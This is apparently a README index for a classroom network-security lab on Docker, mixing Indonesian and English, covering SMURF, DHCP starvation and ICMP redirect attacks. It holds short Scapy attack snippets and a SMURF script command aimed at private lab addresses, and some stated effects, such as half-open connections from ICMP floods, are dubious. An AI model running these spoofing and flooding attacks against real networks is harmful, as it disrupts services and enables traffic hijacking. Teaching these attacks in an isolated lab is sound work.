# 🌐 Pertemuan 5: L3 Security - Lab Index

**Status:** ✅ Ready to Use  
**Last Updated:** 2025-10-27

---

## 📁 Folder Contents

### docker-compose.yml
- **Purpose:** Docker configuration untuk L3 Security lab
- **Services:**
  - `attacker-l3` (Kali Linux attacker)
  - `target-l3` (Vulnerable Ubuntu target)
  - `dhcp-server` (DHCP server)
  - `monitor-l3` (Monitoring/tcpdump)
- **Network:** 192.168.50.0/24
- **Start:** `docker-compose up -d`

### README.md
- **Purpose:** Setup guide dan lab workflow
- **Contains:**
  - Quick start instructions
  - Lab structure explanation
  - Container services detail
  - Common attack commands
  - Troubleshooting guide

### scripts/
- **Purpose:** Attack scripts dan utilities
- **Available:**
  - `smurf_attack.py` - SMURF attack simulation
  - (Add more scripts as needed)
- **Usage:**
  ```bash
  python3 smurf_attack.py 192.168.50.3 192.168.50.255 10
  ```

### captures/
- **Purpose:** Menyimpan PCAP files dari tcpdump
- **Usage:** 
  ```bash
  tcpdump -i eth0 -w capture.pcap
  docker cp monitor-l3:/tmp/capture.pcap captures/
  ```

### configs/
- **Purpose:** Konfigurasi DHCP server dan network setup
- **Files:**
  - dhcpd.conf (DHCP configuration)
  - network config files

---

## 🚀 Quick Start

```bash
# 1. Start lab
docker-compose up -d

# 2. Verify (should show 4 containers)
docker-compose ps

# 3. Monitor network (Terminal 1)
docker-compose exec monitor-l3 bash
tcpdump -i eth0 -n icmp

# 4. Launch attack (Terminal 2)
docker-compose exec attacker-l3 bash
python3 scripts/smurf_attack.py 192.168.50.3 192.168.50.255 10

# 5. Cleanup
docker-compose down
```

---

## 📚 Next Steps

1. **Read:** [Pertemuan5.md](../Pertemuan5.md) - Full theory + hands-on
2. **Follow:** Hands-on sections (starting from section 4)
3. **Practice:**
   - ICMP echo attacks
   - Ping floods
   - SMURF attacks
   - DHCP starvation
   - ICMP redirect spoofing
   - IP fragmentation

---

## 🔧 Lab Workflow

### Terminal Setup (3 terminals)

```
Terminal 1: Monitor Network
docker-compose exec monitor-l3 bash
tcpdump -i eth0 -n

Terminal 2: Target Monitoring
docker-compose exec target-l3 bash
watch -n 1 'netstat -an | wc -l'

Terminal 3: Attacker
docker-compose exec attacker-l3 bash
python3 scripts/smurf_attack.py ...
```

---

## 💡 Key Tools Available

- **Scapy:** Python packet crafting library
- **tcpdump:** Packet capture and analysis
- **netstat:** Network statistics
- **tshark:** Wireshark command-line
- **ping:** ICMP testing
- **iproute2:** Advanced routing

---

## 📊 Lab Topology

```
Docker Network (192.168.50.0/24)
├── attacker-l3 (192.168.50.2)
│   └── Tools: Scapy, hping3, tcpdump
├── target-l3 (192.168.50.3)
│   └── Vulnerable server
├── dhcp-server (192.168.50.4)
│   └── DHCP with vulnerable config
└── monitor-l3 (192.168.50.5)
    └── Monitoring/Analysis
```

---

## 🎯 Attack Scenarios

### SMURF Attack
```bash
python3 scripts/smurf_attack.py \
  192.168.50.3 \      # Target IP (spoofed source)
  192.168.50.255 \    # Broadcast address
  10                  # Duration (seconds)
```

### DHCP Starvation
```bash
python3 << 'EOF'
from scapy.all import *
for i in range(100):
    pkt = IP(dst="192.168.50.4")/UDP(dport=67)/DHCP()
    send(pkt, verbose=0)
EOF
```

### ICMP Redirect
```bash
python3 << 'EOF'
from scapy.all import *
pkt = IP(src="192.168.50.4", dst="192.168.50.3")/\
      ICMP(type=5)/ICMP_Redirect(gateway="192.168.50.2")
send(pkt)
EOF
```

---

## 🔐 Security Notes

- All attacks confined to 192.168.50.0/24 network
- No impact on host or external networks
- Safe for learning and experimentation
- Use for educational purposes only

---

## 📝 What You'll Learn

- ✅ ICMP protocol and vulnerabilities
- ✅ IP spoofing techniques
- ✅ SMURF attacks and amplification
- ✅ DHCP starvation attacks
- ✅ ICMP redirect attacks
- ✅ Network reconnaissance
- ✅ Packet crafting with Scapy
- ✅ Real-time network monitoring

---

## 📊 Expected Observations

### SMURF Attack Impact
- Normal connections: ~50 active connections
- During attack: 1000+ connections
- Server load: Significant increase
- Response time: Degradation or timeout

### Monitoring Results
- tcpdump: See ICMP flood
- netstat: Many half-open states
- Network: Bandwidth saturation

---

**Ready to start?** Run `docker-compose up -d` and follow the hands-on guide!
